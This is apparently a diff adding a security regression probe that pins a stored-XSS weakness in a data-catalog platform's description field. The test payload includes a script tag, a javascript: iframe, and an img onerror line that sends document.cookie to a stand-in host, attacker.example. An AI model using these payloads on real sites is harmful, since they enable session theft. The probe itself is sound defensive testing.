@@ -1,0 +1,106 @@
+---
+probe_id: P-007
+feature_id: F-004
+test_class: security
+verified_against_commit: ede5d277
+prompt_version: probe-runner/0.1.0
+maintainer_curated: true
+stack_profile: odd-minimal
+expected_outcome: |
+  REFACTOR-218 (batch G) found that the backend stores `data_entity.internal_description`
+  verbatim — no Jsoup.clean, no Encode.html, no allowlist. The UI then renders via
+  `react-markdown` + `rehype-raw` WITHOUT `rehype-sanitize`. Stored-content-injection
+  surface for any caller able to write into the description field.
+
+  Probe PUTs an HTML/Markdown payload containing `<script>`, `<img onerror>`, and
+  `<iframe>` tags; then GETs the entity back; then SELECTs the raw column from DB;
+  asserts the dangerous tags are PRESENT verbatim — pinning the backend's
+  no-sanitisation posture. When the fix lands (backend sanitisation), this probe
+  flips: dangerous tags must be absent.
+
+  The UI-side `rehype-sanitize` decision is independent — UI fix would prevent
+  RENDERING the payload but the backend would still STORE it; that's a separate
+  probe (defence-in-depth — should be both).
+---
+
+# P-007 — description backend sanitisation absence (REFACTOR-218)
+
+arrange:
+  - kind: docker-compose-up
+
+  - kind: sql
+    query: |
+      INSERT INTO data_source (id, oddrn, name)
+      VALUES (1007, '//probe-source-P-007/db', 'probe-source-P-007')
+      ON CONFLICT (id) DO NOTHING
+
+  - kind: sql
+    query: |
+      INSERT INTO data_entity
+        (id, oddrn, external_name, data_source_id, type_id, view_count,
+         source_created_at, source_updated_at)
+      VALUES (1007, '//probe-source-P-007/db/tables/p007_xss_target', 'p007_xss_target',
+              1007, 1, 0, NOW(), NOW())
+      ON CONFLICT (id) DO NOTHING
+
+act:
+  - kind: rest
+    method: PUT
+    path: /api/dataentities/1007/description
+    body:
+      internal_description: |
+        # P-007 probe — XSS surface pin
+
+        Normal markdown content here.
+
+        <script>document.cookie='pwned=1';alert('XSS')</script>
+
+        <img src=x onerror="fetch('//attacker.example/leak?c='+document.cookie)" />
+
+        <iframe src="javascript:alert('iframe-xss')"></iframe>
+
+        [[odd-platform-namespace:term-mention]]
+
+        End of payload.
+    capture_as: description_put_response
+
+observe:
+  - kind: sql
+    query: |
+      SELECT internal_description FROM data_entity WHERE id = 1007
+    capture_as: stored_description
+
+assert:
+  # The bug-pinning assertions: dangerous tags stored verbatim.
+  # When backend sanitisation lands, these all flip to assert NOT IN.
+  - "'<script>' in stored_description"
+  - "'onerror=' in stored_description"
+  - "'<iframe' in stored_description"
+  # The term-mention side-channel: even if the caller has no DATA_ENTITY_ADD_TERM,
+  # the description-write would auto-create the term-relation. Backend stores the
+  # raw `[[ns:term]]` syntax in the description; the side-effect of term-linking
+  # is a separate probe target (would need to assert a row in data_entity_to_term).
+  - "'[[odd-platform-namespace:term-mention]]' in stored_description"
+
+cleanup:
+  - kind: docker-compose-down
+    destroy_volumes: true
+
+cross_references:
+  refactoring_scopes: [REFACTOR-218]
+  test_gaps: [TEST-GAP-293, TEST-GAP-295]
+  doc_gaps: [DOC-GAP-096]
+  related_concepts: ["Internal Description (Markdown body)", "Markdown Rendering Pipeline"]
+  retrospectives: [LSN-017]
+
+realism_caveats: |
+  - Probes the BACKEND storage layer only. The UI rendering layer (the actual
+    XSS execution surface) requires Playwright + a visit to /dataentities/1007
+    after the PUT, plus a JS evaluator hook to detect actual script execution.
+    Deferred to a slice-4 defence-in-depth probe.
+  - The term-mention side-channel (REFACTOR-218's secondary finding — description
+    writes auto-create term_relations) needs its own probe to assert a row in
+    data_entity_to_term with is_description_link=true. Slice-4 candidate.
+  - Probe runs under DISABLED auth. The XSS surface applies to ANY auth mode
+    once the writer has DATA_ENTITY_DESCRIPTION_UPDATE; the backend never
+    sanitises regardless of caller.
